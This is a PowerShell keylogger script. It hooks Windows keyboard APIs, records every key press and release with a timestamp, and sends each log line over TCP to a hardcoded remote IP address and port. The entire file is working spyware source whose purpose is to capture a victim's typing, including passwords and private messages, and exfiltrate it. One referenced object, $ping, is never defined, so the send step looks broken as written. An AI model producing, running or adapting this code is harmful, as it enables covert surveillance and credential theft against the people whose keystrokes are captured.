$signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);

'@
$API = Add-Type -MemberDefinition $signature -Name 'Keypress' -Namespace API -PassThru
$val = [bool[]]::new(256)
$started = $false
$port = 1957
$IPA = [system.net.IPAddress]::Parse("92.86.200.151")
while($true){
        for($i = 0; $i -lt 256; $i++){
            if([bool]$API::GetAsyncKeyState($i) -ne $val[$i]){
                $log = ""
                $val[$i] = $API::GetAsyncKeyState($i)
                if(!$started){
                    continue
                }
                if(!([bool][Console]::CapsLock -xor [bool]$val[160]) -and ($i -gt 64) -and ($i -lt 91)){
                    $upper = $false
                }else{
                    $upper = $true
                }
                #Start-Job -Scriptblock{
                    #$i = $args[0]
                    #$IPA = $args[1]
                    #$port = $args[2]
                    #$val = $args[3]
                    $ascii = [char]$i
                    $virtualKey = $API::MapVirtualKey($ascii, 3)
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $API::GetKeyboardState($kbstate)
                    $cchar = New-Object -TypeName System.Text.StringBuilder
                    $null = $API::ToUnicode($ascii, $virtualKey, $kbstate, $cchar, $cchar.Capacity, 0)
                    if($cchar.Length -ne 0){$cchar = $cchar.Chars(0)}
                    if($i -lt 16 -or $i -gt 18){
                        if(!$val[$i]){
                            $log += "   " 
                        }                                                                                     
                        $log+= "$(switch($i){ 1{"LCLICK";break} 2{"RCLICK";break} 8{"BSPACE";break} 9{"TAB";break} 13{"ENT";break} 20{"CAPS";break} 27{"ESC";break} 32{"SPACE";break} 37{"LARROW";break} 38{"UARROW";break} 39{"RARROW";break} 40{"DARROW"} 160{"LSHIFT";break} 161{"RSHIFT";break} 162{"CTRL";break} 164{"LALT";break} 165{"RALT";break} default{$cchar}}) -- $i -- $(if($val[$i]){"DOWN"}else{"UP"}) -- $(if($upper){"UPPER"}else{"LOWER"}) -- $(Get-Date -format "dddd MM/dd/yyyy HH:mm:ss.fff G\MTK")"
                        echo $log
                        if($ping.Send($IPA,0)){
                            $TcpClient=New-Object System.Net.Sockets.TcpClient
                            $cHandle = $TcpClient.Connect($IPA,$port,$null,$null)
                            if($TcpClient.Connected){
                                $buf = [System.Text.Encoding]::ASCII.GetBytes($log)
                                $writer = $TcpClient.GetStream()
                                $writer.Write($buf,0,$buf.Count)
                            }
                            $TcpClient.Close()
                        }
                    }
                #}-ArgumentList $i,$IPA,$port,$val
            }
        
        }
    $started = $true
    Start-Sleep -Milliseconds 10
}